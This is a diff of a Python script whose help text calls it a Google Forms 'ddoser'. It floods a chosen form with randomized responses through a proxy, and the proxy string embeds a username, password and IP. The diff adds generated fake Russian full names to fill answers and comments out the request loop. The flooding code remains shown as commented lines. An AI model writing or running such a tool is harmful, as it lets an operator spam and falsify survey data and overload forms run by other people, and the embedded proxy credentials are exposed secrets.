@@ -1,8 +1,10 @@
 # -*- coding: utf-8 -*-
 
 from json.decoder import JSONDecodeError
+from re import I
 import requests
 import random
+from ShG_rand import Identities     
 
 from LogPython import LogManager
 from bs4 import BeautifulSoup
@@ -16,6 +18,9 @@ import re
 import sys
 
 from http.client import responses
+
+print('Click Version: {}'.format(click.__version__))
+print('Python Version: {} \n'.format(sys.version))
 
 proxies = {"https":"https://cool-leaf-5479p1000:QAKyMxtT@167.99.195.184:5050"}
 
@@ -31,7 +36,7 @@ _third_answer_ = 'Если вы дочитали до этого момента,
 
 random_num = [1, 5]
 
-_link = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdkVj0GVp_ZMV1gab7V7UP0Ct-aij-A4juxI3_roq3sukwR-A/formResponse'
+_link = 'https://docs.google.com/forms/d/1dY2zdiwg86Yq-yyKHGX1SovfDY_W9oUHfWUKma24_N0/viewform?edit_requested=true'
 
 jojo = random.choice(random_num)
 
@@ -49,7 +54,7 @@ def SetLink(change):
         
     f = open(__file__, "r", encoding = "utf-8")
 
-    regex = r"_link\s*\=\s*\'(.*)\'"
+    regex = r"_link\s*\=\s*\'(.*)\'"        
 
     current_file = f.read()
     f.close()
@@ -103,8 +108,32 @@ except:
 def InputUpdater():
     for r in respG:
         r['id'] = 'entry.' + str(r['id'])
+      
+    for i in respG:  
+                   
+        fio = random.choice(Identities.random_surnames()) + ' '\
+            + random.choice(Identities.random_names()) + ' '\
+            + random.choice(Identities.random_patronymic())             
+                   
+        if i['value'] == 'LongAnswer':
+            
+            _ = input(f"{i['quest']}\n Enter long answer: ")
+            
+            if _ == 'fio':
+                i['value'] = fio
+            else:
+                i['value'] = _
                 
     return respG 
+
+InputUpdater()
+
+def LongChecker():
+    _ = InputUpdater()
+    
+    for i in _:
+        if i['value'] == "LongAnswer":
+            pass
 
 def GetInput():
     
@@ -144,9 +173,9 @@ def OtherArgsGetter():
         
 def RaidComporator(ServeList):
     res = dict()
-
+    
     for i in ServeList:
-        res[i['id']] = random.choice(i['value'])
+        res[i['id']] = random.choice(i['value'])                                                                            
       
     fvv, draftResponse, pageHistory, fbzx = OtherArgsGetter()
         
@@ -164,20 +193,20 @@ def raid(a, b, c, d, e:int):
     for i in range(100):
         RaidReqList = RaidComporator(jojo)
                 
-        r = requests.post(_link, 
-                          data = RaidReqList,
-                          headers = headers,
-                          proxies = proxies)
+        # r = requests.post(_link, 
+        #                   data = RaidReqList,
+        #                   headers = headers,
+        #                   proxies = proxies)
                 
-        if r.status_code == 200:
-            status = "OK"
-            LogManager.info(f"{r} === {e + 1} === {status}")
-        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
-            status = responses[r.status_code]
-            LogManager.warning(f"{r} === {e + 1} === {status}")
-        else:
-            status = responses[r.status_code]
-            LogManager.error(f"{r} === {e + 1} === {status}")
+        # if r.status_code == 200:
+        #     status = "OK"
+        #     LogManager.info(f"{r} === {e + 1} === {status}")
+        # elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
+        #     status = responses[r.status_code]
+        #     LogManager.warning(f"{r} === {e + 1} === {status}")
+        # else:
+        #     status = responses[r.status_code]
+        #     LogManager.error(f"{r} === {e + 1} === {status}")
                         
 rand_list = ["Yuno", "Ayumu Kasuga Osaka", "Kiri Komori", "Asuka Soryu Langley", "Kotonoha Katsura", "Machi", "Rika Furude", "Ai Enma", "Nausicaä", "Yoko Littner", "Hitagi Senjougahara", "Ika Musume", "Rena Ryuuguu", "Anna Kurauchi", "Miyako", "Poplar Taneshima", "Akira Amatsume", "Himeko Katagiri", "Suiseiseki", "Hitoha Marui", "Ayumu Nishizawa", "Nadeko Sengoku", "Lum", "Aono Morimiya", "Shion Fujino", "Shiki Ryougi", "Lina Inverse", "Aoi Yamada", "Haruko Haruhara", "Yuki Nagato", "Kaede Fuyou", "Chiri Kitsu", "Ayumi Yamada", "Misaki Nakahara", "Megumi Noda", "Hanyuu Furude", "Kafuka Fuura", "Faye Valentine", "Tomoko Kuroki", "Tamaki Kawazoe", "Kino", "Ayu Tsukimiya", "Mion Sonozaki", "Excel", "Fuuko Ibuki", "Rin Kaga", "Kou", "Celty Sturluson", "Ana Coppola", "Nino", "Sayoko Kurosaki",
              "Tsukasa Hiiragi", "Guchuko", "Sun Seto", "Shouko Kirishima", "Balalaika", "Ukyo Kuonji", "Aika Granzchesta", "Nobue Itoh", "Rebecca Miyamoto", "Alice Carroll", "Isumi Saginomiya", "Ichijou", "Chizuru Minamoto", "Chiaki Minami", "Suigintou", "Marii Buratei", "Nano Shinonome", "Akari Akaza", "Murasaki Kuhouin", "Horo", "Konata Izumi", "Riza Hawkeye", "Sora Kajiwara", "Himeko Inaba", "Dorm Leader", "Risa Koizumi", "Sakaki", "Futaba Marui", "Satsuki Kitaoji", "Nori", "Nagisa Furukawa", "Mahoro Andou", "Rakka", "Chihiro Shindou", "Rei Ayanami", "Haruhi Fujioka", "Yuuko Ichihara", "Mai Kawasumi", "Maki Umezaki", "Tsuyuri", "Kana Minami", "Tsumugi Kotobuki", "Mamimi Samejima", "Olivier Mira Armstrong", "Nanami Aoyama", "Kuro Kagami", "Mashiro Shiina", "Yakumo Tsukamoto", "Matsurika Shinouji"]
@@ -193,7 +222,7 @@ genders = ['Agender', 'Androgyne', 'Androgynous', 'Bigender', 'Cis', 'FTM', 'Gen
 @click.option('--raid', default = 3, help = 'Start ddos any google form`s link')
 @click.option('--resp', default = "text", help = "Get response || Post response")
 @click.option('--log', default = "jojo", help = "Any actions with logs")
-@click.option('--test', default = "OK", help = "For testings commands")
+@click.option('--test', default = "OK", help = "For testing commands")
 def starter(link, resp, raid, log, test):                                              
     
     """Google Form`s ddoser script`s help`s command:\\//"""
@@ -227,8 +256,11 @@ def starter(link, resp, raid, log, test):
         if log == "cls":
             with open("LogPython_info.log", "w") as log_file:
                 log_file.write(" ")
+        if log == "get":
+            for i in LogManager.get_logs(int(input("Enter quantity of logs: ")))[0]:
+                print(i, end ="")
         if test == "jojo":
-            LogManager.warning("No completed")
+            LongChecker()
         if raid == 1:
 
             print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
@@ -273,9 +305,6 @@ def start1():
         # raid(_first_answer_, _second_answer_, _third_answer_, jojo, i)
       
 if __name__ == "__main__":  
-    
-    print('Click Version: {}'.format(click.__version__))
-    print('Python Version: {} \n'.format(sys.version))
     
     starter()
     
